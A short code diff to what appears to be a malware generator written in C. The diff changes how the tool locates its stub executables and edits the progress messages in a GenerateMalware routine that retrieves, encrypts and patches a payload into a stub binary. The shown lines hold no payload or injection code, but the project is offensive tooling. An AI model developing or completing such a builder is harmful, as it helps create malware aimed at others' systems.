@@ -18,6 +18,8 @@ BYTE GetTechniqueIndex(InjectionTechnique technique) {
 
 BOOL GetStubPath(const MalgenConfig* config, CHAR* stub_path) {
     const CHAR* api_name;
+    CHAR exe_dir[MAX_PATH];
+    CHAR* last_slash;
 
     switch (config->api_level) {
     case API_WINAPI:
@@ -34,7 +36,13 @@ BOOL GetStubPath(const MalgenConfig* config, CHAR* stub_path) {
         break;
     }
 
-    sprintf_s(stub_path, MAX_PATH_LEN, "src\\stubs\\stub_%s.exe", api_name);
+    GetModuleFileNameA(NULL, exe_dir, MAX_PATH);
+    last_slash = strrchr(exe_dir, '\\');
+    if (last_slash) {
+        *(last_slash + 1) = '\0';
+    }
+
+    sprintf_s(stub_path, MAX_PATH_LEN, "%s..\\..\\src\\stubs\\stub_%s.exe", exe_dir, api_name);
     return TRUE;
 }
 
@@ -159,7 +167,7 @@ BOOL GenerateMalware(const MalgenConfig* config) {
 
     PrintConfigSummary(config);
 
-    printf("\nretrieving payload...\n");
+    printf("\nretrieving payload\n");
     if (!GetPayload(config->payload_type, &payload, &payload_size)) {
         printf("failed to get payload\n");
         return FALSE;
@@ -176,7 +184,7 @@ BOOL GenerateMalware(const MalgenConfig* config) {
         printf("payload encrypted\n");
     }
 
-    printf("patching stub binary...\n");
+    printf("patching stub binary\n");
     if (!PatchBinary(config, payload, payload_size)) {
         free(payload);
         return FALSE;
